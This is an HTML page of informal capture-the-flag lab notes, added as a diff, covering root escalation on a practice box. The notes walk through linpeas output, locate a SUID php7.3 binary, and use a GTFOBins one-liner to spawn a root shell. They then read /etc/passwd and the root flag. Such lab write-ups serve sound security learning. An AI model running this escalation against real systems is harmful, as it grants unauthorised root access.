@@ -1,0 +1,120 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Linpeas</title>
+</head><body>Will do the bottom up approach this time in the linpeas cuz there is so much system and users details in the starting<br/>
+The interesting thing that stands out here ins the SUID<br/>
+<br/>
+═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                     <br/>
+               ╚═══════════════════╝                                                     <br/>
+╔══════════╣ SUID - Check easy privesc, exploits and write perms<br/>
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                       <br/>
+strings Not Found                                                                      <br/>
+strace Not Found                                                                       <br/>
+-rwsr-xr-- 1 root messagebus 50K Jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                  <br/>
+-rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device<br/>
+-rwsr-xr-x 1 root root 427K Jan 31 2020 /usr/lib/openssh/ssh-keysign<br/>
+-rwsr-xr-x 1 root root 35K Jan 10 2019 /usr/bin/umount ---&gt; BSD/Linux(08-1996)<br/>
+-rwsr-xr-x 1 root root 44K Jul 27 2018 /usr/bin/newgrp ---&gt; HP-UX_10.20<br/>
+-rwsr-xr-x 1 root root 51K Jan 10 2019 /usr/bin/mount ---&gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8<br/>
+-rwsr-xr-x 1 root root 4.6M Feb 13 2021 /usr/bin/php7.3 (Unknown SUID binary!)<br/>
+-rwsr-xr-x 1 root root 63K Jan 10 2019 /usr/bin/su<br/>
+-rwsr-xr-x 1 root root 53K Jul 27 2018 /usr/bin/chfn ---&gt; SuSE_9.3/10<br/>
+-rwsr-xr-x 1 root root 63K Jul 27 2018 /usr/bin/passwd ---&gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)<br/>
+-rwsr-xr-x 1 root root 44K Jul 27 2018 /usr/bin/chsh<br/>
+-rwsr-xr-x 1 root root 83K Jul 27 2018 /usr/bin/gpasswd<br/>
+<br/>
+╔══════════╣ SGID<br/>
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                       <br/>
+-rwxr-sr-x 1 root shadow 31K Jul 27 2018 /usr/bin/expiry                                                  <br/>
+-rwxr-sr-x 1 root tty 35K Jan 10 2019 /usr/bin/wall<br/>
+-rwxr-sr-x 1 root ssh 315K Jan 31 2020 /usr/bin/ssh-agent<br/>
+-rwxr-sr-x 1 root tty 15K May 4 2018 /usr/bin/bsd-write<br/>
+-rwxr-sr-x 1 root crontab 43K Oct 11 2019 /usr/bin/crontab<br/>
+-rwxr-sr-x 1 root mail 19K Dec 3 2017 /usr/bin/dotlockfile<br/>
+-rwxr-sr-x 1 root shadow 71K Jul 27 2018 /usr/bin/chage<br/>
+-rwxr-sr-x 1 root shadow 39K Feb 14 2019 /usr/sbin/unix_chkpwd<br/>
+<br/>
+<br/>
+Cuz in the Suid we have the Root ownership (i.e. can run this binary as root and can abuse that feature)<br/>
+Will find the permission settings (i.e. will be there in the checklist as well)<br/>
+www-data@blackpearl:/tmp$ <b>find / -type f -perm -4000 2&gt;/dev/null</b><br/>
+find / -type f -perm -4000 2&gt;/dev/null<br/>
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br/>
+/usr/lib/eject/dmcrypt-get-device<br/>
+/usr/lib/openssh/ssh-keysign<br/>
+/usr/bin/umount<br/>
+/usr/bin/newgrp<br/>
+/usr/bin/mount<br/>
+/usr/bin/php7.3<br/>
+/usr/bin/su<br/>
+/usr/bin/chfn<br/>
+/usr/bin/passwd<br/>
+/usr/bin/chsh<br/>
+/usr/bin/gpasswd<br/>
+www-data@blackpearl:/tmp$ <br/>
+<br/>
+As we have rws permission here which means we can run this and whenever we run this we have the ability to run this as the user that owns it (i.e. root)<br/>
+<br/>
+And the quickest way to that that is GTFObins and were able to find php and in that will select the suid<br/>
+<a href="https://gtfobins.github.io/gtfobins/php/#suid">https://gtfobins.github.io/gtfobins/php/#suid</a><br/>
+<br/>
+Shell<br/>
+www-data@blackpearl:/tmp$<b>/usr/bin/php7.3 -r &quot;pcntl_exec('/bin/sh', ['-p']);&quot;</b><br/>
+Sudo/usr/bin/php7.3 -r &quot;pcntl_exec('/bin/sh', ['-p']);&quot;<br/>
+# whoami<br/>
+Sudowhoami<br/>
+/bin/sh: 1: Sudowhoami: not found<br/>
+# ls<br/>
+ls<br/>
+index.html<br/>
+linpeas.sh<br/>
+systemd-private-1fd66986dca54aa6a4394f0a226c17f4-systemd-timesyncd.service-ECr4S6<br/>
+# whoami<br/>
+whoami<br/>
+root<br/>
+# cat /etc/passwd<br/>
+cat /etc/passwd<br/>
+root:x:0:0:root:/root:/bin/bash<br/>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>
+bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>
+sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>
+sync:x:4:65534:sync:/bin:/bin/sync<br/>
+games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br/>
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br/>
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br/>
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br/>
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br/>
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br/>
+alek:x:1000:1000:alek,,,:/home/alek:/bin/bash<br/>
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br/>
+mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false<br/>
+bind:x:107:113::/var/cache/bind:/usr/sbin/nologin<br/>
+# cd /root<br/>
+cd /root<br/>
+# ls<br/>
+ls<br/>
+flag.txt<br/>
+# cat flag.txt<br/>
+cat flag.txt<br/>
+Good job on this one.<br/>
+Finding the domain name may have been a little guessy,<br/>
+but the goal of this box is mainly to teach about <b>Virtual Host Routing</b>which is used in a lot of CTF.<br/>
+<br/>
+ash-5.0# id<br/>
+id<br/>
+uid=33(www-data) gid=33(www-data) <b>euid=0(root)</b>groups=33(www-data)<br/>
+even though we are a normal user but we have the root euid so can run anything as a root level (i.e. we are staying as a root user and running in a shell that is executed by root (i.e. we have owned it))</body></html>
